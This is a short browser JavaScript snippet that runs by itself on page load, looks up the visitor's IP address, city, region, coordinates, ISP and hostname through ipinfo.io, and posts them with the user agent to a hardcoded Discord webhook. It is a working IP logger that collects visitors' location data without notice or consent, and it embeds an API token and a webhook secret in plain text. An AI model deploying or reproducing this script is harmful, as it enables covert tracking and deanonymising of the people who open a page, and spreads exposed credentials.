async function sendVisitorInfoToWebhook() {
  try {
    const IPINFO_TOKEN = '3d0edac049b516';
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1380223931813728357/WqWP3bYvJJlO-YKLHepPAoRdijcQNYJcCDwaat91mGa4T1Uxb2QM9GftqRUzkZDflj5X';

    const userAgent = navigator.userAgent;

    const geoResponse = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
    const geoData = await geoResponse.json();

    const embed = {
      title: 'Visitor Info',
      color: 0x3498db,
      fields: [
        { name: 'IP', value: geoData.ip || 'N/A', inline: true },
        { name: 'City', value: geoData.city || 'N/A', inline: true },
        { name: 'Region', value: geoData.region || 'N/A', inline: true },
        { name: 'Country', value: geoData.country || 'N/A', inline: true },
        { name: 'Location', value: geoData.loc || 'N/A', inline: true },
        { name: 'Organization', value: geoData.org || 'N/A', inline: true },
        { name: 'Hostname', value: geoData.hostname || 'N/A', inline: true },
        { name: 'User Agent', value: userAgent, inline: false },
        { name: 'Timestamp', value: new Date().toISOString(), inline: false }
      ],
      timestamp: new Date().toISOString()
    };

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    console.log('Visitor info sent to webhook as embed.');
  } catch (error) {
    console.error('Failed to send visitor info:', error);
  }
}

sendVisitorInfoToWebhook();
